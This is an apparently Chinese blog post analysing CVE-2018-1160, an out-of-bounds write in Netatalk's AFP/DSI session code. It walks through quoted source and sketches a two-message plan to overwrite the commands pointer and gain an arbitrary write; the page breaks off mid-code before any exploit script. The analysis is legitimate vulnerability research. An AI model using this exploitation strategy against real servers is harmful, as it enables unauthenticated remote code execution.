<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="Closure" />
  <meta name="description" content="" />
  
  
  <title>
    
      CVE-2018-1160 
      
      
      |
    
     Closure
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">Closure</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">主页</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">归档</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">关于我</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">CVE-2018-1160</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
          2023-10-09 23:45:48
        </span>
        
              <span class="post-tags">
                <i class="iconfont icon-tags mr-10" title="标签"></i>
                
                <span class="span--tag mr-8">
                  <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="漏洞复现">
                    #漏洞复现
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <h1 id="CVE-2018-1160"><a href="#CVE-2018-1160" class="headerlink" title="CVE-2018-1160"></a>CVE-2018-1160</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>漏洞简介：</p>
<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;CVE-2018-1160</code></pre>

<p>3.1.12之前的Netatalk容易受到dsi_opensess.c中越界写入的影响，缺乏对攻击者数据边界检查，未经身份验证的远程攻击者可以利用此漏洞实现任意代码执行。</p>
<p>Netatalk简介：</p>
<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;Netatalk&#x2F;netatalk</code></pre>

<p>是一个免费开源的文件管理器，实现了AFP(Apple Filing Protocol)，是Apple Macintosh和Apple II计算机的主要文件共享协议。</p>
<h2 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h2><p>Netatalk3.1.11源码：</p>
<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;netatalk&#x2F;files&#x2F;netatalk&#x2F;3.1.11&#x2F;</code></pre>

<p>首先先确定下漏洞位置，根据漏洞简介找一下dsi_opensess.c：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358606.png"></p>
<p>由于是越界写的问题，所以我们可以关注一下关于能写入的函数：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358608.png"></p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358609.png" alt="image-20230628102041087"></p>
<p>因为代码就一点点，基本可以确定漏洞为第一个memcpy：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>attn_quantum<span class="token punctuation">,</span> dsi<span class="token operator">-></span>commands <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> dsi<span class="token operator">-></span>commands<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>为了确定为啥会有漏洞，让我们来看看这个memcpy函数的各个参数都是啥，可以看到都涉及到dsi&#x3D;&#x3D;》直接右键选择转到类型定义：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DSI_DATASIZ</span>       <span class="token expression"><span class="token number">65536</span></span></span>

<span class="token comment">/* child and parent processes might interpret a couple of these
 * differently. */</span>
<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">DSI</span> <span class="token punctuation">&#123;</span>
	<span class="token comment">//…………</span>
    <span class="token class-name">uint32_t</span> attn_quantum<span class="token punctuation">,</span> datasize<span class="token punctuation">,</span> server_quantum<span class="token punctuation">;</span>   <span class="token comment">//第一个参数</span>
    <span class="token class-name">uint16_t</span> serverID<span class="token punctuation">,</span> clientID<span class="token punctuation">;</span>
    <span class="token class-name">uint8_t</span>  <span class="token operator">*</span>commands<span class="token punctuation">;</span> <span class="token comment">/* DSI recieve buffer */</span>  <span class="token comment">//第二，三个参数相关  0~255</span>
    <span class="token class-name">uint8_t</span>  data<span class="token punctuation">[</span>DSI_DATASIZ<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* DSI reply buffer */</span>
    <span class="token class-name">size_t</span>   datalen<span class="token punctuation">,</span> cmdlen<span class="token punctuation">;</span>
    <span class="token class-name">off_t</span>    read_count<span class="token punctuation">,</span> write_count<span class="token punctuation">;</span>
    <span class="token class-name">uint32_t</span> flags<span class="token punctuation">;</span>             <span class="token comment">/* DSI flags like DSI_SLEEPING, DSI_DISCONNECTED */</span>
    <span class="token keyword">int</span>      socket<span class="token punctuation">;</span>            <span class="token comment">/* AFP session socket */</span>
    <span class="token keyword">int</span>      serversock<span class="token punctuation">;</span>        <span class="token comment">/* listening socket */</span>
	<span class="token comment">//…………</span>
<span class="token punctuation">&#125;</span> DSI<span class="token punctuation">;</span></code></pre>

<p>可以看到第一个参数指向dsi中的成员attn_quantum，为一个4字节的无符号整型，第二个参数为uint8_t类型，0~0xff（255）&#x3D;&#x3D;》memcpy函数将从dsi-&gt;commands的索引i + 1开始复制dsi-&gt;commands[i]字节到&amp;dsi-&gt;attn_quantum所指向的地址&#x3D;&#x3D;》当memcpy复制的大小dsi-&gt;commands[i]为我们所控制，memcpy将导致<strong>越界写</strong>，能覆盖attn_quantum, datasize, server_quantum,serverID, clientID,*commands，但是由于后续的data[DSI_DATASIZ]过于大65536，所以只能溢出到data的一部分。</p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>确定完漏洞的位置，我们还要搞清楚程序的执行流程，要如何传入数据可以触发漏洞函数。</p>
<p>那就从main函数开始看起：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358610.png" alt="image-20230628110801670"></p>
<p>在main中根据已有的注释信息，大概判断一下关于对网络连接的处理，例下方设置监听AFP：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358611.png" alt="image-20230628112924166"></p>
<p>往下翻翻就可以看到一个大while，大致判断一下关于网络连接的处理应该是在这个大while中了：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358612.png"></p>
<p>继续往下翻翻，可以看到关于监听套接字的文件描述符LISTEN_FD：</p>
<p>在服务器程序中，当服务器需要监听来自客户端的连接请求时，通常要创建一个监听套接字，并通过bind()和listen()函数将其绑定到指定的地址和端口上；</p>
<p>LISTEN_FD就是用来表示这个监听套接字的的文件描述符&#x3D;&#x3D;》通过描述符，服务器可以使用相关的系统调用（例：accept()）来接收客户端的连接请求，并创建新的套接字来处理与客户端的通信；、</p>
<p>通常，服务器程序会使用多进程或多线程的方式，通过复制多个LISTEN_FD来实现并发处理多个请求&#x3D;&#x3D;》在AFP中也是类似，对于每个用户请求都会为其fork一个子进程进行处理，而父进程则负责<strong>监控</strong>请求的处理。</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358613.png"></p>
<p>&#x3D;&#x3D;》通过遍历asev-&gt;fdset数组，检查每个文件描述符的<strong>事件状态</strong>revents（事件返回后的事件标志，每个位代表不同的类型事件）</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202309111631315.png" alt="image-20230911163144237"></p>
<p>POLLIN表示有可读数据，也就是文件描述符上有可读事件；POLLIN被定义为POLLRDNORM | POLLRDBAND，这种情况下POLLIN将被定位为同时包括POLLRDNORM（普通可读事件）和POLLRDBAND（优先可读事件）两种事件；使用按位或操作可以同时检测两种事件；</p>
<p>POLLERR表示文件描述符上出现了错误事件；</p>
<p>POLLHUP表示文件描述符上出现了挂起（连接关闭）事件；</p>
<p>POLLNVAL表示不是一个有效的文件描述符；</p>
<p>&#x3D;&#x3D;》判断是否存在需要处理的事件，若存在待处理事件，则根据fdtype确定是哪种类型的套接字&#x3D;&#x3D;》</p>
<p>对于LISTEN_FD，它负责监听套接字的事件，当监听套接字上发生事件，表示有新的请求到达&#x3D;&#x3D;》<strong>调用dsi_start()函数</strong>进行处理请求，并创建一个子进程来处理对客户端的通信，创建的子进程会继承监听套接字的文件描述符，并将其添加到asev中；</p>
<p>若成功创建子进程并将套接字添加到asev中，就会对其进行一些操作：检查asev是否还有插槽，如果没有则输出错误日志&#x3D;&#x3D;》关闭子进程的IPC文件描述符，并将其标记为未使用&#x3D;&#x3D;》最后使用SIGKILL信号强制中止子进程。</p>
<p>&#x3D;&#x3D;》所以对于请求处理应该在dsi_start()函数中：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358614.png"></p>
<p>调用了dsi_getsession函数，那就继续看看定义：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358616.png" alt="image-20230628134805691"></p>
<p>函数调用了dsi-&gt;proto_open(dsi)进行TCP消息的接收和处理，根据注释找到dsi_tcp.c，在其中的初始化函数dsi_tcp_init中可以看到：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358617.png" alt="image-20230628140638246"></p>
<p>所以dsi-&gt;proto_open()的函数实体是dsi_tcp_open()：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/* accept the socket and do a little sanity checking */</span>
<span class="token keyword">static</span> <span class="token class-name">pid_t</span> <span class="token function">dsi_tcp_open</span><span class="token punctuation">(</span>DSI <span class="token operator">*</span>dsi<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token class-name">pid_t</span> pid<span class="token punctuation">;</span>
    SOCKLEN_T len<span class="token punctuation">;</span>

    len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>
    dsi<span class="token operator">-></span>socket <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>serversock<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>dsi<span class="token operator">-></span>client<span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">//……</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>dsi<span class="token operator">-></span>socket <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token function">getitimer</span><span class="token punctuation">(</span>ITIMER_PROF<span class="token punctuation">,</span> <span class="token operator">&amp;</span>itimer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//使用fork创建子进程</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">==</span> <span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/* child */</span>
        <span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">itimerval</span> timer <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>DSI_TCPTIMEOUT<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">sigaction</span> newact<span class="token punctuation">,</span> oldact<span class="token punctuation">;</span>
        <span class="token class-name">uint8_t</span> block<span class="token punctuation">[</span>DSI_BLOCKSIZ<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//用于接收DSI数据</span>
        <span class="token class-name">size_t</span> stored<span class="token punctuation">;</span>

        <span class="token comment">/* reset signals */</span>
        <span class="token function">server_reset_signal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//…………</span>
        <span class="token function">dsi_init_buffer</span><span class="token punctuation">(</span>dsi<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/* read in commands. this is similar to dsi_receive except
         * for the fact that we do some sanity checking to prevent
         * delinquent connections from causing mischief. */</span>

        <span class="token comment">/* read in the first two bytes */</span>
        <span class="token comment">//读取两个字节</span>
        len <span class="token operator">=</span> <span class="token function">dsi_stream_read</span><span class="token punctuation">(</span>dsi<span class="token punctuation">,</span> block<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>len <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">/* connection already closed, don't log it (normal OSX 10.3 behaviour) */</span>
            <span class="token function">exit</span><span class="token punctuation">(</span>EXITERR_CLOSED<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;</span> <span class="token number">2</span> <span class="token operator">||</span> <span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> DSIFL_MAX<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> DSIFUNC_MAX<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">LOG</span><span class="token punctuation">(</span>log_error<span class="token punctuation">,</span> logtype_dsi<span class="token punctuation">,</span> <span class="token string">"dsi_tcp_open: invalid header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span>EXITERR_CLNT<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">/* read in the rest of the header */</span>
        <span class="token comment">//读取剩下的header</span>
        stored <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>stored <span class="token operator">&lt;</span> DSI_BLOCKSIZ<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            len <span class="token operator">=</span> <span class="token function">dsi_stream_read</span><span class="token punctuation">(</span>dsi<span class="token punctuation">,</span> block <span class="token operator">+</span> stored<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span> <span class="token operator">-</span> stored<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
                stored <span class="token operator">+=</span> len<span class="token punctuation">;</span>
            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token function">LOG</span><span class="token punctuation">(</span>log_error<span class="token punctuation">,</span> logtype_dsi<span class="token punctuation">,</span> <span class="token string">"dsi_tcp_open: stream_read: %s"</span><span class="token punctuation">,</span> <span class="token function">strerror</span><span class="token punctuation">(</span>errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">exit</span><span class="token punctuation">(</span>EXITERR_CLNT<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
		<span class="token comment">//将DSI（数据包） header的值复制到dsi->header结构体里</span>
        dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_flags <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_command <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_requestID<span class="token punctuation">,</span> block <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span>
               <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_requestID<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_code<span class="token punctuation">,</span> block <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_len<span class="token punctuation">,</span> block <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_len<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_reserved<span class="token punctuation">,</span> block <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">,</span>
               <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_reserved<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        dsi<span class="token operator">-></span>clientID <span class="token operator">=</span> <span class="token function">ntohs</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_requestID<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/* make sure we don't over-write our buffers. */</span>
        dsi<span class="token operator">-></span>cmdlen <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token function">ntohl</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_len<span class="token punctuation">)</span><span class="token punctuation">,</span> dsi<span class="token operator">-></span>server_quantum<span class="token punctuation">)</span><span class="token punctuation">;</span>

        stored <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token comment">//读取DSI command到dis->commands指针指向的buf中</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>stored <span class="token operator">&lt;</span> dsi<span class="token operator">-></span>cmdlen<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            len <span class="token operator">=</span> <span class="token function">dsi_stream_read</span><span class="token punctuation">(</span>dsi<span class="token punctuation">,</span> dsi<span class="token operator">-></span>commands <span class="token operator">+</span> stored<span class="token punctuation">,</span> dsi<span class="token operator">-></span>cmdlen <span class="token operator">-</span> stored<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
                stored <span class="token operator">+=</span> len<span class="token punctuation">;</span>
            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token function">LOG</span><span class="token punctuation">(</span>log_error<span class="token punctuation">,</span> logtype_dsi<span class="token punctuation">,</span> <span class="token string">"dsi_tcp_open: stream_read: %s"</span><span class="token punctuation">,</span> <span class="token function">strerror</span><span class="token punctuation">(</span>errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">exit</span><span class="token punctuation">(</span>EXITERR_CLNT<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">/* stop timer and restore signal handler */</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">/* send back our pid */</span>
    <span class="token keyword">return</span> pid<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>总的来说就是调用fork创建子进程，在子进程中将从TCP会话中读取的DSI header复制到dsi-&gt;header结构体里，再将DSI command读取到dsi-&gt;commands指向的buf中；</p>
<p>&#x3D;&#x3D;》根据返回值是父进程还是子进程进入不同的处理逻辑：</p>
<p>父进程：直接返回，继续回去监听socket；</p>
<p>子进程：进入DSI消息处理逻辑，根据后续dsi_command的值进行不同的处理：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358618.png"></p>
<p>当dsi_command值为DSIFUNC_OPEN时，将调用dsi_opensession（漏洞）函数，初始化DSI会话；</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358619.png" alt="image-20230628134229849"></p>
<p>在这其中涉及到了dsi-&gt;header.dsi_command：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358620.png"></p>
<p>看一下定义：右键header转到类型定义：这个dsi_block就是消息的头部了</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DSI_BLOCKSIZ</span> <span class="token expression"><span class="token number">16</span></span></span>
<span class="token keyword">struct</span> <span class="token class-name">dsi_block</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">uint8_t</span> dsi_flags<span class="token punctuation">;</span>       <span class="token comment">/* packet type: request or reply */</span>
    <span class="token class-name">uint8_t</span> dsi_command<span class="token punctuation">;</span>     <span class="token comment">/* command */</span>
    <span class="token class-name">uint16_t</span> dsi_requestID<span class="token punctuation">;</span>  <span class="token comment">/* request ID */</span>
    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">uint32_t</span> dsi_code<span class="token punctuation">;</span>   <span class="token comment">/* error code */</span>
        <span class="token class-name">uint32_t</span> dsi_doff<span class="token punctuation">;</span>   <span class="token comment">/* data offset */</span>
    <span class="token punctuation">&#125;</span> dsi_data<span class="token punctuation">;</span>
    <span class="token class-name">uint32_t</span> dsi_len<span class="token punctuation">;</span>        <span class="token comment">/* total data length */</span>
    <span class="token class-name">uint32_t</span> dsi_reserved<span class="token punctuation">;</span>   <span class="token comment">/* reserved field */</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<p>再之后就来到漏洞函数里了：</p>
<p>由switch得知dsi_opensession函数将判断commands[0]的值，若为DSIOPT_ATTNQUANT将会触发越界写：</p>
<p>以commands[1]为大小（<strong>可控制</strong>），将commands[2]之后的内容拷贝至&amp;dsi-&gt;attn_quantum;</p>
<p>并且在上文DSI结构体中*commands是uint8_t类型，占用4bytes，也就是最大0xff大小（0-255）；</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token class-name">uint8_t</span>  <span class="token operator">*</span>commands<span class="token punctuation">;</span></code></pre>

<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358608.png"></p>
<p>将导致越界写漏洞，根据写入位置与结构体成员变量，该漏洞将覆盖attn_quantum, datasize, server_quantum,serverID, clientID,*commands,data[DSI_DATASIZ]；</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202309121935589.png"></p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DSI_DATASIZ</span>       <span class="token expression"><span class="token number">65536</span></span></span></code></pre>

<p>因为data数组较大，所以最多也就覆盖至data的部分空间；</p>
<p>在上文漏洞定位中提到越界写将覆盖掉*commands，刚好是一个指针，且能覆盖为任意值，若在这之后能向覆盖后的指针指向的位置写入数据，将能实现任意写，而写入的动作在程序中应该表现为读取DSI数据内容并复制&#x3D;&#x3D;》</p>
<p>我们将需要发送两次DSI消息：</p>
<p>1、覆盖commands指针为目标地址（hook）</p>
<p>2、触发读取消息的函数，实现向目标地址中写数据</p>
<p>所以我们的程序分析还没有结束，从漏洞所在函数返回子进程到dsi_start中：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358621.png"></p>
<p>接下来程序将会继续执行afp_over_dsi函数了：该函数用于继续会话，使用阻塞的方式继续读取消息；</p>
<p>而在afp_over_dsi的大while中就可以看到一个读取函数dsi_stream_receive了：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202308012358622.png" alt="image-20230628151651959"></p>
<p>dsi_stream_receive：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/*!
 * Read DSI command and data
 *
 * @param  dsi   (rw) DSI handle
 *
 * @return    DSI function on success, 0 on failure
 */</span>
<span class="token keyword">int</span> <span class="token function">dsi_stream_receive</span><span class="token punctuation">(</span>DSI <span class="token operator">*</span>dsi<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> block<span class="token punctuation">[</span>DSI_BLOCKSIZ<span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token function">LOG</span><span class="token punctuation">(</span>log_maxdebug<span class="token punctuation">,</span> logtype_dsi<span class="token punctuation">,</span> <span class="token string">"dsi_stream_receive: START"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>dsi<span class="token operator">-></span>flags <span class="token operator">&amp;</span> DSI_DISCONNECTED<span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token comment">/* read in the header */</span>
  <span class="token comment">//与刚刚上文分析的类似的流程，读取DSI header到dsi->header</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dsi_buffered_stream_read</span><span class="token punctuation">(</span>dsi<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>block<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">)</span> 
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

  dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_flags <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_command <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_command <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
